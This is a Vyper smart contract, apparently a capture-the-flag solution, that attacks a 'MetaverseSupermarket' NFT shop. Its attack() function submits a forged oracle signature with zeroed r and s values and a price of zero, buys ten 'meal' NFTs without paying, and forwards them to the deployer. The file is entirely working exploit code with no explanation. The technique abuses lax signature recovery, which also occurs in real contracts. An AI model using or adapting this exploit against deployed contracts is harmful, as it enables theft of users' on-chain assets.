# @version ^0.3.7

from vyper.interfaces import ERC721 as IERC721

interface IMetaverseSupermarket:
    def meal() -> address: view
    def buyUsingOracle(
        oraclePrice: OraclePrice,
        signature: Signature,
    ): nonpayable

struct OraclePrice:
    blockNumber: uint256
    price: uint256

struct Signature:
    v: uint8
    r: bytes32
    s: bytes32

owner: immutable(address)

infla_store: IMetaverseSupermarket
meal: address

@external
@payable
def __init__(_infla_store: address):
    owner = msg.sender
    self.infla_store = IMetaverseSupermarket(_infla_store)
    self.meal = self.infla_store.meal()

@external
def attack():
    assert msg.sender == owner, "!owner"
    oracle_price: OraclePrice = OraclePrice(
        {
            blockNumber: block.number,
            price: empty(uint256),
        }
    )
    _signature: Signature = Signature(
        { v: 27, r: empty(bytes32), s: empty(bytes32),
        }
    )
    for token_id in range(10):
        self.infla_store.buyUsingOracle(
            oracle_price,
            _signature,
        )
        IERC721(self.meal).transferFrom(self, owner, token_id)

@external
def onERC721Received(
    operator: address,
    sender: address,
    tokenId: uint256,
    data: Bytes[32]
) -> bytes4:
    selector: bytes4 = convert(
        method_id("onERC721Received(address,address,uint256,bytes)"),
        bytes4,
    )
    return selector
